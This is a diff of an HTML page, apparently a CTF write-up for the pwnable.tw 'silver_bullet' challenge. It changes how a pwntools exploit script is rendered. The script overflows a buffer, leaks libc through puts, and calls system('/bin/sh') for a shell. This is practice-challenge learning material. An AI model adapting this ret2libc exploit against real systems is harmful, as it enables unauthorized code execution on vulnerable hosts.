@@ -164,73 +164,77 @@ Hi, i'm th3_5had0w, nice to meet you, welcome to my darkness kingdom, where i of
 <h4 id="wise-words-from-my-master">Wise words from my master:</h4>
 <blockquote>
   <h4 id="instead-of-ba7-you-could-use-bxffxffxffba4-to-kill-the-wolf-in-one-time">“Instead of <code class="language-plaintext highlighter-rouge">b'A'*7</code> you could use <code class="language-plaintext highlighter-rouge">b'\xff\xff\xff'+b'A'*4</code> to kill the wolf in one time”</h4>
-  <p>```python
-from pwn import *</p>
 </blockquote>
 
-<p>io = process(‘./silver_bullet’)
-#io = remote(‘chall.pwnable.tw’, 10103)
-#libc = ELF(‘libc_32.so.6’)
-libc = ELF(‘/lib/i386-linux-gnu/libc.so.6’)
-elf = ELF(‘./silver_bullet’)</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<p>def power_up(des):
-    print(io.recvuntil(b’choice :’))
-    io.sendline(b’2’)
-    print(io.recvuntil(b’description of bullet :’))
-    io.sendline(des)</p>
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./silver_bullet'</span><span class="p">)</span>
+<span class="c1">#io = remote('chall.pwnable.tw', 10103)
+#libc = ELF('libc_32.so.6')
+</span><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'/lib/i386-linux-gnu/libc.so.6'</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./silver_bullet'</span><span class="p">)</span>
 
-<p>def beat():
-    print(io.recv())
-    io.sendline(b’3’)</p>
+<span class="k">def</span> <span class="nf">power_up</span><span class="p">(</span><span class="n">des</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'choice :'</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'description of bullet :'</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">des</span><span class="p">)</span>
 
-<p>#–init–
-print(io.recvuntil(b’choice :’))
-io.sendline(b’1’)
-print(io.recvuntil(b’description of bullet :’))
-init_pl = b’A’*47
-io.sendline(init_pl)
-#——–</p>
+<span class="k">def</span> <span class="nf">beat</span><span class="p">():</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>
 
-<p>#– phase 1 - leak libc –
-payload = b’A’
-power_up(payload)
-payload = b’A’*7+p32(elf.sym[‘puts’])+p32(elf.sym[‘main’])+p32(elf.got[‘puts’])
-power_up(payload)
-beat()
-print(io.recvuntil(‘Sorry … It still alive !!’))
-beat()
-print(io.recvuntil(‘Oh ! You win !!’))
-a = io.recv()
-print(a.split(b’\n’))
-#————————-</p>
+<span class="c1">#--init--
+</span><span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'choice :'</span><span class="p">))</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'description of bullet :'</span><span class="p">))</span>
+<span class="n">init_pl</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">47</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">init_pl</span><span class="p">)</span>
+<span class="c1">#--------
+</span>
 
-<p>#leak libc</p>
+<span class="c1">#-- phase 1 - leak libc --
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span>
+<span class="n">power_up</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'puts'</span><span class="p">])</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'main'</span><span class="p">])</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">])</span>
+<span class="n">power_up</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">beat</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Sorry ... It still alive !!'</span><span class="p">))</span>
+<span class="n">beat</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Oh ! You win !!'</span><span class="p">))</span>
+<span class="n">a</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">a</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">))</span>
+<span class="c1">#-------------------------
+</span>
 
-<p>libc.address = u32(a.split(b’\n’)[1])-libc.sym[‘puts’]
-print(‘[+] Base libc: ‘, hex(libc.address))</p>
+<span class="c1">#leak libc
+</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">a</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">])</span><span class="o">-</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'[+] Base libc: '</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
 
-<p>#———</p>
+<span class="c1">#---------
+</span>
 
-<p>#– phase 2 - exploit –</p>
+<span class="c1">#-- phase 2 - exploit --
+</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'description of bullet :'</span><span class="p">))</span>
+<span class="n">init_pl</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">47</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">init_pl</span><span class="p">)</span>
 
-<p>io.sendline(b’1’)
-print(io.recvuntil(b’description of bullet :’))
-init_pl = b’A’*47
-io.sendline(init_pl)</p>
 
-<p>payload = b’A’
-power_up(payload)
-payload = b’A’*7+p32(libc.sym[‘system’])+p32(libc.sym[‘exit’])+p32(next(libc.search(b’/bin/sh’)))
-power_up(payload)
-beat()
-print(io.recvuntil(‘Sorry … It still alive !!’))
-beat()
-print(io.recvuntil(‘Oh ! You win !!’))
-print(io.recv())
-io.interactive()
-#————————-
-```</p>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span>
+<span class="n">power_up</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">])</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'exit'</span><span class="p">])</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">)))</span>
+<span class="n">power_up</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">beat</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Sorry ... It still alive !!'</span><span class="p">))</span>
+<span class="n">beat</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Oh ! You win !!'</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="c1">#-------------------------
+</span></code></pre></div></div>
 
 <p>Thanks for reading, if you want to ask anything, please comment below. :D</p>
 
